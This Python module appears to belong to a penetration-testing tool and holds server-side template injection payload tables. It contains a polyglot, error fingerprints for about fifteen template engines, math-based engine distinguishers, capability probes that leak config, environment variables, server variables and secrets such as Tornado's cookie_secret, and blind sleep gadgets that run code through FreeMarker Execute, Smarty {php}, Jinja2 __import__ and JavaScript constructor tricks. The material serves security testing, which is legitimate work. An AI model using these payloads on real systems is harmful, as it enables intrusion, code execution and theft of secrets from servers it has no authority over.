"""SSTI polyglot + engine-distinguisher + capability payload tables."""

from __future__ import annotations


_POLYGLOT = "${{<%[%'\"}}%\\"

# Phase-1 error / fingerprint patterns. Order matters — first match wins.
# Keep patterns narrow; broad matches like "Error" false-positive.
_POLYGLOT_HINTS: list[tuple[str, list[str]]] = [
    ("jinja2",     ["jinja2.exceptions", "TemplateSyntaxError", "UndefinedError",
                    "tag name expected"]),
    ("twig",       ["Twig\\Error", "Twig_Error", "Unexpected token", "Twig\\Sandbox"]),
    ("freemarker", ["FreeMarker template error", "freemarker.core.",
                    "ParseException", "freemarker.template"]),
    ("velocity",   ["org.apache.velocity", "ParseErrorException",
                    "Velocity parser"]),
    ("smarty",     ["Smarty error", "Smarty_Compiler", "Smarty:"]),
    ("erb",        ["(erb):", "ERB::SyntaxError", "compile error"]),
    ("mako",       ["mako.exceptions", "SyntaxException", "Mako template"]),
    ("nunjucks",   ["nunjucks", "Template render error", "Line "]),
    ("handlebars", ["Handlebars", "Parse error on line"]),
    ("tornado",    ["tornado.template", "ParseError"]),
    ("thymeleaf",  ["org.thymeleaf", "TemplateInputException"]),
    ("spring_el",  ["SpelEvaluationException", "SpelParseException",
                    "EL1041E", "Expression"]),
    ("liquid",     ["Liquid syntax error", "Liquid::SyntaxError"]),
    ("pug",        ["pug:", "Jade", "unexpected token"]),
]

# Phase-2 math distinguishers. Each tuple = (payload, expected_marker,
# candidate_engines). Engines that share a syntax family ({{...}},
# ${...}, etc.) get narrowed by the capability phase, not here.
_DISTINGUISHERS: list[tuple[str, str, list[str]]] = [
    # Strong distinguishers — single-engine
    ("{{7*'7'}}",       "7777777",  ["jinja2"]),                          # Python str * int
    ("{{7*'7'}}",       "49",       ["twig"]),                            # PHP numeric coerce
    # Family-wide (refined in phase 3)
    ("{{7*7}}",         "49",       ["jinja2", "twig", "nunjucks", "tornado",
                                     "handlebars", "liquid"]),
    ("${7*7}",          "49",       ["freemarker", "mako", "spring_el",
                                     "thymeleaf"]),
    ("<%= 7*7 %>",      "49",       ["erb"]),
    ("#{7*7}",          "49",       ["pug"]),
    ("{7*7}",           "49",       ["smarty"]),
    ("#set($x=7*7)$x",  "49",       ["velocity"]),
    ("@(7*7)",          "49",       ["razor"]),
    ("[[${7*7}]]",      "49",       ["thymeleaf"]),
]

# Phase-3 capability probes — READ-ONLY enumeration. Each tuple =
# (capability_name, payload, marker_substring). marker_substring is what
# we expect to see in the response body to call the capability confirmed.
_CAPABILITIES: dict[str, list[tuple[str, str, str]]] = {
    "jinja2": [
        ("config_leak",     "{{config}}",                                 "Config"),
        ("flask_globals",   "{{request.application.__globals__.keys()}}", "dict_keys"),
        ("sandbox_classes", "{{''.__class__.__mro__[1].__subclasses__()}}", "subprocess"),
    ],
    "twig": [
        ("self_env",        "{{_self.env}}",                              "Twig"),
        ("server_dump",     "{{app.request.server.all|join(',')}}",       "HTTP_"),
    ],
    "freemarker": [
        ("data_model",      "<#list .data_model?keys as x>${x},</#list>", ","),
        ("exec_available",  "${\"freemarker.template.utility.Execute\"?new()}", "Execute"),
    ],
    "velocity": [
        ("classtool",       "$class.inspect(\"java.lang.System\").type",  "System"),
    ],
    "smarty": [
        ("version",         "{$smarty.version}",                          "."),
    ],
    "erb": [
        ("constants",       "<%= self.class.constants.first(3) %>",       ":"),
    ],
    "thymeleaf": [
        ("env_leak",        "${T(java.lang.System).getenv()}",            "PATH"),
    ],
    "spring_el": [
        ("env_leak",        "${T(java.lang.System).getenv()}",            "PATH"),
        ("appctx",          "${applicationContext}",                      "applicationContext"),
    ],
    "mako": [
        ("cwd_probe",       "<%import os%>${os.getcwd()}",                "/"),
    ],
    "nunjucks": [
        ("range_constr",    "{{range.constructor(\"return 49\")()}}",     "49"),
    ],
    "handlebars": [
        ("lookup_constr",   "{{this.constructor.constructor('return 49')(this)}}", "49"),
    ],
    "tornado": [
        ("settings",        "{{handler.settings}}",                       "cookie_secret"),
    ],
    "pug": [
        ("env_path",        "#{global.process.env.PATH}",                 "/"),
    ],
    "liquid": [
        ("page_json",       "{{page | json}}",                            "{"),
    ],
    "razor": [
        ("env_var",         "@System.Environment.MachineName",            ""),  # any non-empty
    ],
}

# Phase-4 blind sleep gadgets — payload uses literal __SECS__ which we
# substitute at runtime. Sleep server-side; SOC-loud; opt-in only.
_BLIND_SLEEPS: dict[str, str] = {
    "jinja2":     "{{__import__('time').sleep(__SECS__)}}",
    "tornado":    "{% import time %}{{time.sleep(__SECS__)}}",
    "mako":       "<%import time%>${time.sleep(__SECS__)}",
    "nunjucks":   "{{range.constructor(\"return new Promise(r=>setTimeout(r,__SECS__*1000))\")()}}",
    "smarty":     "{php}sleep(__SECS__){/php}",
    "erb":        "<%= sleep __SECS__ %>",
    "freemarker": "${\"freemarker.template.utility.Execute\"?new()(\"sleep __SECS__\")}",
}


# ─────────────────────────────────────────────────────────────────────────
# HTTP plumbing — single send through Burp's curl proxy
# ─────────────────────────────────────────────────────────────────────────


__all__ = ['_POLYGLOT', '_POLYGLOT_HINTS', '_DISTINGUISHERS', '_CAPABILITIES', '_BLIND_SLEEPS']
